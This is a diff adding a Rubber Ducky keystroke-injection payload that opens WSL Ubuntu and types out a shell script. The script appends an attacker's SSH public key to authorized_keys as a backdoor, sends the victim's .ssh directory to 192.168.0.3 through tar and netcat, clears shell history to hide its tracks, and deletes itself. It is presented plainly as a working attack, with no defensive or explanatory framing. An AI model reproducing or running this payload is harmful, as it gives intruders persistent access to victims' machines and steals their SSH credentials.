@@ -1,0 +1,29 @@
+REM RUBBER DUCKY VERSION 1
+GUI r
+DELAY 250
+STRING ubuntu
+DELAY 250
+ENTER
+DELAY 1000
+STRING nano sample.sh
+ENTER
+STRING touch ~/.ssh/authorized_keys
+ENTER
+STRING rm ~/sample.sh
+ENTER
+STRING echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDJz+uLagY7SoQbW/zUdBRdW3WnocUz+5FON8We9UITO sample@host >> ~/.ssh/authorized_keys
+ENTER
+STRING cp -r ~/.ssh ~/temp_dir
+ENTER
+STRING tar cf - temp_dir | nc 192.168.0.3 30000
+ENTER
+STRING rm -rf ~/temp_dir
+ENTER
+STRING history -c && history -w
+CTRL x
+y
+ENTER
+STRING chmod +x sample.sh
+ENTER
+STRING ./sample.sh && exit
+ENTER
